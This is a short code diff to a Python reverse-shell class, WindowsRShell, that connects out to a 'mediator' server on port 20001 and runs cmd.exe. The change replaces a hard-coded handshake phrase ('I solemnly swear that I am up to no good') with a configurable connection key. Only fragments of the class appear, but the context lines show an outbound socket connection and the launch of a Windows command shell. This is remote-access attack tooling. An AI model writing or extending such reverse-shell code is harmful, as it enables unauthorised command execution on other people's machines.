@@ -15,7 +15,8 @@ import threading
 
 
 class WindowsRShell:
-    def __init__(self, mediatorHost):
+    def __init__(self, mediatorHost="", connectionKey="CHANGE ME!!!"):
+        self.connectionKey = connectionKey
         self.handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         if not mediatorHost:
             raise(ValueError("Hostname of mediator server not specified."))
@@ -54,7 +55,7 @@ class WindowsRShell:
 
     def connect(self, mediatorHost):
         self.handler.connect((socket.gethostbyname(mediatorHost), 20001))
-        self.handler.sendall("I solemnly swear that I am up to no good.".encode())
+        self.handler.sendall(self.connectionKey.encode())
 
     def run(self):
         cmdexe = subprocess.Popen(["\\windows\\system32\\cmd.exe"],
